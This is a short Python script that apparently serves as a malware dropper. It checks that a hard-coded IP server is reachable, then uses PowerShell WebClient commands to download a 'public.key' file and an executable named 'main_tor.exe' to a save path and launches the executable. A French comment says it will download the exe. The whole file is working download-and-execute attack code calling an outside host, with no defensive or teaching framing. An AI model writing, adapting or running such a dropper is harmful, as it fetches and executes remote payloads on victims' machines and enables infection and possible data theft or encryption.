import os
import Dropper
import requests

def test_access_to_webpage(url):
    print("[*] Testing access to the webpage: {}".format(url))
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"[*] Access to the webpage: {url} : Success")
            return True
        else:
            return False
    except:
        print(f"[*] Access to the webpage: {url} : Failed")
        return False



def main():
    print(u"Ici va télécharger l'exe")
    url = "http://54.90.113.98:8000/"
    if test_access_to_webpage(url):
        try:
            os.system(f"powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile('{url}public.key', '{Dropper.save_path}\\public.key')")
            os.system(f"powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile('{url}main_tor.exe', '{Dropper.save_path}\\main_tor.exe')")
            os.popen(f"powershell.exe -Command Invoke-Item {Dropper.save_path}\\main_tor.exe")
            return True
        except:
            print("Error")
            return False
    else:
        return False

"""
url = "http://54.90.113.98:8000/"
print(f"{url}main_tor.exe")
"""
#main()
